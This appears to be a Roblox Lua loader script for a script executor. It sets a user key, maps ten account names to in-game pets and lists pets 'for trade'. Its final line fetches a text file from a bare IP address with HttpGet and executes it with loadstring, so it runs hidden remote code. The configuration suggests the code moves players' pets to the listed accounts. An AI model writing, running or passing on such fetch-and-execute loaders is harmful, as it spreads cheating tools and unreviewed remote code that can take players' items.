repeat wait() until game:IsLoaded()
repeat wait() until game:GetService("Players")
repeat wait() until game:GetService("Players").LocalPlayer
repeat wait() until game:GetService("Players").LocalPlayer.PlayerGui

_G.UserKey = "venoz"
_G.HostName = {
    ["Kinasramer08074"] = "Capybara",
    ["Odemsficek078"] = "Capybara",
    ["Faconzelen34784"] = "Capybara",
    ["Fardzubi57714"] = "Capybara",
    ["Kathipallo865"] = "Capybara",
    ["Supkoranne9833"] = "Capybara",
    ["Daanefida910"] = "Lobster Thermidor",
    ["Semracaras53548"] = "Lobster Thermidor",
    ["Bileyhusen1183"] = "French Fry Ferret",
    ["Curacheah23092"] = "French Fry Ferret",
}

_G.SelectPetForTrade = {
    "Capybara",
    "Lobster Thermidor",
    "French Fry Ferret"
}

loadstring(game:HttpGet("http://103.245.164.141/OScript.txt"))()